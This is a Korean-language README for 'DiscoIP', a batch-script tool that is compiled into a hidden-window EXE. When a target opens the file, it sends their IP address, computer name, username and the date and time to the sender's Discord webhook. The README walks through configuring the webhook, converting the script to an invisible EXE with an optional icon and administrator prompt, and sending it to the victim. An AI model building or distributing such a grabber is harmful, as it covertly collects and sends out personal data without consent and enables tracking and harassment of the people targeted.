

![DiscoIP](https://media.discordapp.net/attachments/958277561228599326/973200040438927440/-001_99.png?width=700&height=200)
__ __ __ __ __ __ __
# DiscoIP 를 시작하세요!

<details markdown="1">
<summary>DiscoIP란?</summary>
상대방의 파일 클릭 한번으로 상대방의 아이피를 알아내세요!<br/>
DiscoIP는 상대가 EXE 파일을 열면 상대의 아이피가 디스코드 웹훅크로 오는 시스템입니다
</details>
<br/>
<details markdown="1">
<summary>주의사항</summary>

- **세팅만 해주시고 그 외의 코드를 삽입해주지 말아주세요(중요)**<br/>
사용자가 바이러스로 개조할 가능성이 있습니다.
제발 하지 말아주세요!<br/>
- **DiscoIP는 Curl 라이브러리를 사용하기 떄문에 사용자의 컴퓨터에 Curl 이 다운되어 있지 않으면 웹훅크를 보낼 수 없습니다**<br/>
대부분 컴퓨터는 Curl 이 기본적으로 다운되어 있지만 일부 컴퓨터는 다운되어 있지 않을 수 있습니다<br/>
[CURL ](https://curl.se/)
</details>
<br/>
<details markdown="1">
<summary>기본파일 세팅 & 기본파일 EXE 로 변환하여 배포파일로</summary>
<br/><br/>

## 1단계 : 편집화면으로 가기<br/><br/>

DiscoIP V2.bat 을 우클릭 > 편집으로 가주세요  <br/><br/>
그리고 이 부분으로 가주세요.<br/><br/>


``` batch
REM "█▀▄ █ █▀ █▀▀ █▀█ █ █▀█"
REM "█▄▀ █ ▄█ █▄▄ █▄█ █ █▀▀"
Rem ----------------------------------------------------------- Setting --------------------------------------------------
SET WEBHOOK_URL=webhooklink
SET Provide_additional_information=TRUE
Rem ----------------------------------------------------------------------------------------------------------------------
```
<br/><br/>

## 2단계 : 기본 파일 세팅<br/><br/>

- 웹훅크 세팅법 (필수)
``` batch
SET WEBHOOK_URL=webhooklink
```
에서 webhooklink 대신 상대방의 아이피가 오길 원하는 웹훅크의 링크를 써주세요.
<br/><br/>
- 고급 정보 Send (선택)

``` batch
SET Provide_additional_information=TRUE
```
값이 True 일때 = 날짜,시간, 상대 컴퓨터의 이름, 상대유저의 이름을 포함하여 웹후크를 보냅니다<br/>
값이 False 일떄 = 상대의 아이피만 보냅니다<br/><br/>
기본적으로 True 값이 들어가 있기 떄문에 바꿀 필요가 없습니다
<br/><br/>

## 3단계 : 기본 파일을 EXE로 변환하여 배포파일로 만들기<br/><br/>
[Bat to exe Converter](https://en.softonic.com/download/bat-to-exe-converter-x64/windows/post-download)
를 다운로드 하고 열어주세요.<br/>
메뉴바의 Open 버튼 누르고 세팅한 기본 파일 선택<br/>
오른쪽에 Exe-Format 에서 "64 BitㅣWindows (Invisible)" 아니면 "32 BitㅣWindows (Invisible)"선택 <br/>
선택사항들<br/>
Icon : 배포파일 아이콘 지정<br/>
UAC : 배포파일을 열떄 관리자 권한 요구<br/>
메뉴에서 Convert 눌르고 배포파일 이름 정하기<br/>
이러면 배포파일이 생성됩니다!<br/>
배포파일을 상대방에게 보내보세요!

</details>
<br/>
<details markdown="1">
<summary>오류해결</summary>
<br/>

# Error 1
<br/>

``` 
Error : 1
```

<br/>

``` 
wrong value
```
<br/>
Provide_additional_information 의 변수값이 잘못되었기 떄문에 발생하는 에러입니다.<br/>

``` batch
SET Provide_additional_information=T/F
```
에서 T/F 자리에 True, False 대신 다른 값이 있다면 바꿔주세요.
</details>
